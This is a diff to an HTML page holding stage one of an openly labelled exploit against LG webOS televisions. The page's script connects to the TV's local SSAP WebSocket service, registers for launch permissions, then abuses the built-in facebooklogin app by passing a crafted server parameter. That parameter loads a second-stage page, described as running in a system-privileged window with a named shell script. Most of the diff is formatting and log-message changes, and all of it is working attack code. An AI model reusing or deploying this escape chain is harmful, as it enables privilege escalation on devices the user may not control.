@@ -11,7 +11,7 @@
         #btn-reset { background-color: #444; color: #bbb; }
         .button:focus { outline: 4px solid #fff; transform: scale(1.05); }
         .note { border: 1px solid #ffcc00; color: #ffcc00; padding: 12px; font-size: 0.85rem; max-width: 350px; border-radius: 10px; text-align: left; }
-        #log { background: #000; color: #00ff00; width: 80%; height: 120px; margin-top: 20px; padding: 10px; text-align: left; font-family: monospace; font-size: 0.8rem; border: 1px solid #333; }
+        #log { background: #000; color: #00ff00; width: 80%; height: 120px; margin-top: 20px; padding: 10px; text-align: left; font-family: monospace; font-size: 0.8rem; border: 1px solid #333; overflow-y: auto; }
     </style>
 </head>
 <body>
@@ -28,38 +28,60 @@
         const logBox = document.getElementById('log');
         const SITE_URL = window.location.origin;
 
-        function log(m) { logBox.innerHTML += `<br>> ${m}`; logBox.scrollTop = logBox.scrollHeight; }
+        function log(m) { 
+            logBox.innerHTML += `<br>> ${m}`; 
+            logBox.scrollTop = logBox.scrollHeight; 
+        }
 
         function beginExploit(scriptName) {
             log("Connecting to SSAP...");
             const ws = new WebSocket('ws://127.0.0.1:3000');
+            
             ws.onopen = () => {
+                log("Connected. Please accept the prompt on TV.");
                 ws.send(JSON.stringify({
-                    id: "reg", type: "register",
-                    payload: { forcePairing: false, pairingType: "PROMPT", manifest: { permissions: ["LAUNCH", "READ_INSTALLED_APPS"] } }
+                    id: "register_0",
+                    type: "register",
+                    payload: { 
+                        forcePairing: false, 
+                        pairingType: "PROMPT", 
+                        manifest: { permissions: ["LAUNCH", "READ_INSTALLED_APPS"] } 
+                    }
                 }));
             };
 
             ws.onmessage = (e) => {
                 const res = JSON.parse(e.data);
                 if (res.type === "registered") {
-                    log("Escaping via Facebook Login...");
-                    // This triggers Stage 2 inside a System-privileged window
-                    const stage2Url = `${SITE_URL}/stage2.html?run=${scriptName}`;
+                    log("Registered. Escaping via facebooklogin...");
+                    // Passing the script name as a URL parameter to Stage 2
+                    const stage2Url = `${SITE_URL}/stage2.html?script=${scriptName}`;
+                    
                     ws.send(JSON.stringify({
-                        id: "launch", type: "request", uri: "ssap://system.launcher/launch",
+                        id: "launch_stage2",
+                        type: "request",
+                        uri: "ssap://system.launcher/launch",
                         payload: {
                             id: "com.webos.app.facebooklogin",
-                            params: { server: stage2Url.replace('https://', '').replace('http://', '') + "#" }
+                            params: { 
+                                server: stage2Url.replace('https://', '').replace('http://', '') + "#" 
+                            }
                         }
                     }));
                 }
-                if (res.id === "launch") { ws.close(); log("Stage 2 Launched."); }
+                if (res.id === "launch_stage2") {
+                    log("Stage 2 Triggered. Closing Stage 1...");
+                    ws.close();
+                }
             };
+
+            ws.onerror = () => log("Connection failed. Check 'LG Connect Apps' settings.");
         }
 
         document.getElementById('btn-return').addEventListener('click', () => beginExploit('beanbird.sh'));
         document.getElementById('btn-reset').addEventListener('click', () => beginExploit('reboot.sh'));
+        
+        // Remote Support
         document.addEventListener('keydown', (e) => { if(e.keyCode === 13) document.activeElement.click(); });
         window.onload = () => document.getElementById('btn-return').focus();
     </script>
